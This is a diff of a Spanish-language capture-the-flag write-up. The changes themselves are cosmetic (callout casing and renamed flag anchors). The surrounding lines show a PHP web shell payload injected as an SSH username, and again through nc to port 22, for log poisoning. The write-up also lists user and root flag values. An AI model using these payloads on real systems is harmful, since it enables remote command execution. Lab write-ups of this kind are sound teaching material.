@@ -81,7 +81,7 @@ ssh '<?php system($_GET["cmd"])?>'@<IP_VICTIMA>
 ```
 Parece que esto fue corregido y ya no se pueden poner caracteres raros en donde iría el nombre del usuario.
 
->[!TIP]
+>[!tip]
 Para poder inyectar el código anterior hay que hacerlo a través de `nc`:
 ```
 echo '<?php system($_GET["cmd"])?>' | nc $(cat ip) 22
@@ -193,10 +193,10 @@ Con esto, se completó la escalada y se obtuvo la bandera de root, culminando ex
 
 ## Bandera(s)
 
-> [!FLAG] `flag{user}`
+> [!flag] `flag{user}`
 > 98342721012390839081
-^bandera
+^bandera-user
 
-> [!FLAG] `flag{root}`
+> [!flag] `flag{root}`
 4NJSA99SD7922197D7S90PLAWE
-^bandera
+^bandera-root
